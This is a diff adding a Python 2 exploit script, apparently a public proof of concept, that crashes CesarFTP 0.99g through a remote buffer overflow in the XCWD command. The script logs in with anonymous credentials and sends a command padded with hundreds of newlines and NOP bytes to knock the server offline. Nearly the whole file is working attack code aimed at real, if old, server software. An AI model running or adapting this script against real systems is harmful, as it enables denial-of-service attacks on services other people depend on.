@@ -1,0 +1,32 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+# Exploit Title     	: CesarFTP 0.99g -(XCWD)Remote BoF Exploit
+# Discovery by  	    	: Irving Aguilar
+# Email			: im.aguilar@protonmail.ch
+# Discovery Date    	: 18.01.2016
+# Tested Version    	: 0.99g
+# Vulnerability Type  : Denial of Service (DoS)
+# Tested on OS      	: Windows XP Professional SP3 x86 es
+
+import socket
+
+
+buffer = 'XCWD ' + '\n' * 667 +'\x90' * 20
+target = '192.168.1.73'
+port = 21
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((target, port))
+print '[*] Target: ' + target
+print '[*] Port: ' + str(port)
+s.recv(1024)
+
+s.send('USER ftp\r\n')
+s.recv(1024)
+
+s.send('PASS ftp\r\n')
+s.recv(1024)
+
+s.send( buffer  + '\r\n')
+print '[+] Buffer sent'
+s.close()
